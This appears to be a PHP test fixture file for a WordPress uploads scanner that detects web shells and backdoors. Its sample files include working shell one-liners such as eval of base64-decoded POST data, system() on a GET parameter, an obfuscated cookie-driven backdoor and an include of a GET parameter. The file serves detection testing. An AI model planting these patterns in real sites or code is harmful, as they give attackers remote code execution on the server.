<?php
// phpcs:ignoreFile
$uploads = function ( $t, array $files ) {
	foreach ( $files as $rel => $body ) { $t->file( 'uploads/' . $rel, $body ); }
	$t->state()['uploads'] = $t->tmp . '/uploads';
};
return array(
	'fires' => array(
		'setup'  => function ( $t ) use ( $uploads ) {
			$uploads( $t, array( '2026/11/photo.jpg' => 'jpg', '2026/11/wp-conf1g.php' => '<?php eval(base64_decode($_POST["x"]));', 'index.php' => '' ) );
		},
		'expect' => array( 'count' => 1, 'severity' => 'critical', 'route' => 'human', 'subject' => '2026/11/wp-conf1g.php' ),
	),
	'fires_phtml_and_nonstandard_index' => array(
		'setup'  => function ( $t ) use ( $uploads ) {
			$uploads( $t, array( 'a/shell.phtml' => '<?php', 'b/index.php' => '<?php echo "not silence"; system($_GET["c"]);' ) );
		},
		'expect' => array( 'count' => 2 ),
	),
	'clean' => array(
		'setup'  => function ( $t ) use ( $uploads ) {
			$uploads( $t, array(
				'index.php'            => '',
				'2026/index.php'       => "<?php\n// Silence is golden.\n",
				'2026/11/photo.jpg'    => 'jpg',
				'2026/11/doc.pdf'      => 'pdf',
				'wp-migrate-db/x.php'  => '<?php // allowlisted plugin path',
				'custom-vendor/ok.php' => '<?php // allowed by filter',
			) );
			add_filter( 'omens_audit/uploads_allow', function ( $a ) { $a[] = 'custom-vendor/*'; return $a; } );
		},
		'expect' => array( 'count' => 0 ),
	),
	// 1.0.3: every file class the first fleet run flagged that plugins put there themselves, with the bytes they really hold.
	'clean_fleet_allowlist' => array(
		'setup'  => function ( $t ) use ( $uploads ) {
			$uploads( $t, array(
				'redux/select.php'                                   => "<?php\n   class Redux_Customizer_Control_select extends Redux_Customizer_Control {\n     public \$type = \"redux-select\";\n   }",
				'redux/index.php'                                    => "<?php\n//Silence is golden",
				'alm_templates/default.php'                          => "<?php\n    global \$post; \n\t\$quote = get_field( 'quote', \$post->ID);",
				'calendarize-it/calendarize-it-help/calendarize-it-help.php' => "<?php\n\n/**\nPlugin Name: Calendarize It! Contextual Help\n*/",
				'calendarize-it/calendarize-it-help/includes/serialized_help.php' => "<?php\n\$serialized_help = <<<EOT\na:1:{}\nEOT;",
				'smile_fonts/Defaults/charmap.php'                   => "<?php\n/**\n * Charmap.\n */\n\n\$icons = array();\n\$icons['Defaults']['glass'] = 'f000';",
				'smile_fonts/Defaults/index.php'                     => "<?php\n/*Silence is Golden*/ // PHPCS:ignore:Squiz.Commenting.FileComment.WrongStyle\n",
				'mailchimp-for-wp/debug-log.php'                     => "<?php exit; ?>\n[2020-12-08 15:59:56] ERROR: Form 6669 > Mailchimp API error: 400 Bad Request.\n",
				'wpforms/cache/index.php'                            => "<?php\nheader( \$_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found' );\nheader( 'Status: 404 Not Found' );\n",
				'learndash/logs/index.php'                           => '//LearnDash is THE Best LMS',
				'learndash/templates/index.php'                      => '// nothing to see here',
				'2026/index.php'                                     => "<?php\n// Silence is golden.\n",
			) );
		},
		'expect' => array( 'count' => 0 ),
	),
	// A plugin path does not launder a dropper: no Redux signature, shell markers present.
	'fires_redux_named_dropper' => array(
		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( 'redux/select.php' => '<?php $x = base64_decode($_POST["p"]); eval($x);' ) ); },
		'expect' => function ( $f, $run, $t ) { $t->assert( 1 === count( $f ) && 'critical' === $f[0]['severity'] && 0 === strpos( $f[0]['title'], 'Suspected web shell' ), 'expected one suspected-shell finding, got ' . json_encode( array_map( fn( $x ) => $x['title'], $f ) ) ); },
	),
	// The burninstitute backdoor, byte for byte in shape: cookie input, variable function call, create_function.
	'fires_cookie_backdoor_is_named_a_shell' => array(
		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( '2015/06/javascript18.php' => "<?php\n\n\$kvpdp=\$_COOKIE;\n\$oslnp=\$kvpdp[puko];\nif(\$oslnp){\n\t\$vwff=\$oslnp(\$kvpdp[zqij]);\$nln=\$oslnp(\$kvpdp[kfyo]);\$ysega=\$vwff(\"\",\$nln);\$ysega();\n}\n" ) ); },
		'expect' => function ( $f, $run, $t ) { $t->assert( 1 === count( $f ) && 'critical' === $f[0]['severity'] && 0 === strpos( $f[0]['title'], 'Suspected web shell' ) && false !== strpos( $f[0]['summary'], '$_COOKIE' ), 'expected the cookie backdoor named as a shell, got ' . json_encode( $f ) ); },
	),
	// A zero-byte random-named file is inert but still filed, at moderate.
	'fires_empty_remnant_is_moderate' => array(
		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( '2022/02/zrhmykeo.php' => '', '2022/04/otqvqfnz.php' => '' ) ); },
		'expect' => function ( $f, $run, $t ) { $t->assert( 2 === count( $f ), 'expected two findings' ); foreach ( $f as $x ) { $t->assert( 'moderate' === $x['severity'] && 0 === strpos( $x['title'], 'Inert PHP file' ), 'expected an inert moderate finding, got ' . $x['title'] . ' ' . $x['severity'] ); } },
	),
	// The Mailchimp log without its exit guard, and a guard-looking index.php that runs code, both still fire.
	'fires_log_without_guard_and_index_with_code' => array(
		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( 'mailchimp-for-wp/debug-log.php' => "<?php echo 1; ?>\n[log]", 'x/index.php' => "<?php\n// Silence is golden.\ninclude \$_GET['f'];" ) ); },
		'expect' => array( 'count' => 2, 'severity' => 'critical' ),
	),
	'overflow_caps_listing' => array(
		'setup'  => function ( $t ) use ( $uploads ) {
			$files = array();
			for ( $i = 0; $i < 60; $i++ ) { $files[ "d/s$i.php" ] = '<?php'; }
			$uploads( $t, $files );
		},
		'expect' => function ( $f, $run, $t ) { $t->assert( 51 === count( $f ), 'expected 50 + overflow, got ' . count( $f ) ); $t->assert( 'overflow' === end( $f )['subject'], 'last finding should be the overflow note' ); },
	),
);
